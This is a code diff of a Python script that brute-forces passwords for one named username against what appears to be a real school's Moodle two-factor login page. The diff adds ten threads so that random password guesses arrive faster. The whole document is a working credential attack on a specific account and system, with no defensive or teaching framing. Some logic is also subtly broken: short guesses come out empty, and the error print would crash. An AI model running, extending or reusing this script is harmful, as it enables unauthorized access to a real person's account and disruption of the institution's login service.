@@ -2,10 +2,14 @@ import requests
 import re
 import math
 import random 
+import threading
+import time
 from itertools import combinations
 import sys
+
 url = "https://moodle2.helmholtz-karlsruhe.de/moodle/blocks/exa2fa/login/"
 loginTokenRegex = re.compile('type="hidden" name="logintoken" value="(\w*)"', re.IGNORECASE)
+threadCount = 10
 
 def check(username, password):
     req = requests.session()
@@ -35,13 +39,29 @@ def check(username, password):
     else:
         print("Fehler LOL1 ("+ res.status_code + ")") 
         return False
+
 chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW1234567890,.-#+^°!"§$%&/()=?{[]}\\;:_\'*~'
 charlenght = len(chars)
+
 def numtostring(num):
     return chars[num % charlenght] + numtostring(math.floor(num / charlenght)) if num >= charlenght else ""
-while True:
-    passwd = numtostring(math.floor(random.random() * math.pow(charlenght, 6)))
-    if check("schellpa",passwd):
-        print("Found working: " + passwd)
-        sys.exit()
-        
+
+
+def bruteforcePasswd(username):
+    running = True
+    while running:
+        passwd = numtostring(math.floor(random.random() * math.pow(charlenght, 6)))
+        if check(username, passwd):
+            print("Found working: " + passwd)
+            running = False
+
+
+threads = []
+for i in range(threadCount):
+    thread = threading.Thread(target=bruteforcePasswd, args=("schellpa", ), daemon=True)
+    thread.start()
+    threads.append(thread)
+
+while all(t.is_alive() for t in threads):
+    time.sleep(1)
+sys.exit()
